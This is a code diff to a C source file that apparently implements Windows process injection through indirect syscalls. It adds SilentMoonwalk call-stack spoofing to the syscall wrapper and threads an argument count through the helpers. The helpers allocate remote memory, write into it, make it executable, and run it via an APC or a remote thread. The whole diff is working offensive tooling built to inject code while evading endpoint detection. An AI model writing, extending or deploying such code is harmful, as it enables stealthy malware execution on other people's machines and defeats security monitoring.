@@ -12,6 +12,10 @@
 #include <stdlib.h>
 #include <string.h>
 
+#if defined(NTSYS_SMW)
+#include "smw/smw.h"
+#endif
+
 typedef struct {
   unsigned short Length;
   unsigned short MaximumLength;
@@ -230,8 +234,32 @@ uintptr_t ntsys_gadget(void) {
 int ntsys_ready(void) { return ntsys_gadget() != 0; }
 
 long ntsys_invoke(unsigned int ssn, uintptr_t gadget,
-                  const unsigned long long *args /* [11] */) {
+                  const unsigned long long *args /* [11] */, int argc) {
   long ret;
+#if defined(NTSYS_SMW)
+  /*
+   * SilentMoonwalk spoofs the call stack by synthesizing unwind frames with
+   * its own assembly stub, which has an 8-argument ceiling. Route every
+   * narrower syscall through it; wider ones (NtCreateThreadEx) keep the
+   * plain indirect path. smw_ensure_init() is checked first because
+   * spoof_call() also returns 0 on a failed init, which would otherwise be
+   * mistaken for a successful NTSTATUS.
+   */
+  if (argc <= 8 && smw_ensure_init()) {
+    FUNCTION_CALL call;
+    int i;
+
+    memset(&call, 0, sizeof(call));
+    call.ptr = (PVOID)gadget;
+    call.ssn = ssn;
+    call.argc = argc;
+    for (i = 0; i < argc; i++) {
+      call.args[i] = (ULONG_PTR)args[i];
+    }
+    return (long)spoof_call(&call);
+  }
+#endif
+  (void)argc; /* only meaningful to the SilentMoonwalk branch above */
   /* Frame math: the prologue pushes rdi/rsi/rbx (24 bytes), then we reserve
    * 0x58 = 24 (saved regs) + 8 (ret addr handled by call) ... the 7 stack
    * slots live at 0x20..0x50 and must stay strictly below the pushed regs;
@@ -276,7 +304,8 @@ BOOL ntsys_alloc_rw(HANDLE proc, void **base, SIZE_T *size) {
   args[3] = (unsigned long long)&rsize; /* in/out: region size */
   args[4] = MEM_COMMIT | MEM_RESERVE;
   args[5] = PAGE_READWRITE;
-  st = ntsys_invoke(ntsys_ssn("NtAllocateVirtualMemory"), ntsys_gadget(), args);
+  st = ntsys_invoke(ntsys_ssn("NtAllocateVirtualMemory"), ntsys_gadget(), args,
+                    6);
   if (st < 0) {
     return FALSE;
   }
@@ -294,8 +323,8 @@ BOOL ntsys_write_mem(HANDLE proc, void *base, const void *buf, SIZE_T len) {
   args[2] = (unsigned long long)buf;
   args[3] = (unsigned long long)len;
   args[4] = (unsigned long long)&written;
-  return ntsys_invoke(ntsys_ssn("NtWriteVirtualMemory"), ntsys_gadget(),
-                      args) >= 0;
+  return ntsys_invoke(ntsys_ssn("NtWriteVirtualMemory"), ntsys_gadget(), args,
+                      5) >= 0;
 }
 
 BOOL ntsys_protect_rx(HANDLE proc, void **base, SIZE_T *size) {
@@ -310,7 +339,8 @@ BOOL ntsys_protect_rx(HANDLE proc, void **base, SIZE_T *size) {
   args[2] = (unsigned long long)&rsize;
   args[3] = PAGE_EXECUTE_READ;
   args[4] = (unsigned long long)&old;
-  st = ntsys_invoke(ntsys_ssn("NtProtectVirtualMemory"), ntsys_gadget(), args);
+  st = ntsys_invoke(ntsys_ssn("NtProtectVirtualMemory"), ntsys_gadget(), args,
+                    5);
   if (st < 0) {
     return FALSE;
   }
@@ -324,7 +354,8 @@ BOOL ntsys_queue_apc(HANDLE thread, void *routine) {
 
   args[0] = (unsigned long long)thread;
   args[1] = (unsigned long long)routine; /* normal routine: void (*)(ULONG_PTR) */
-  return ntsys_invoke(ntsys_ssn("NtQueueApcThread"), ntsys_gadget(), args) >= 0;
+  return ntsys_invoke(ntsys_ssn("NtQueueApcThread"), ntsys_gadget(), args,
+                      5) >= 0;
 }
 
 BOOL ntsys_create_remote_thread(HANDLE proc, void *routine, HANDLE *out) {
@@ -337,7 +368,7 @@ BOOL ntsys_create_remote_thread(HANDLE proc, void *routine, HANDLE *out) {
   args[3] = (unsigned long long)proc;
   args[4] = (unsigned long long)routine;
   args[6] = 0; /* run immediately, not suspended */
-  st = ntsys_invoke(ntsys_ssn("NtCreateThreadEx"), ntsys_gadget(), args);
+  st = ntsys_invoke(ntsys_ssn("NtCreateThreadEx"), ntsys_gadget(), args, 11);
   if (st < 0 || h == NULL) {
     return FALSE;
   }
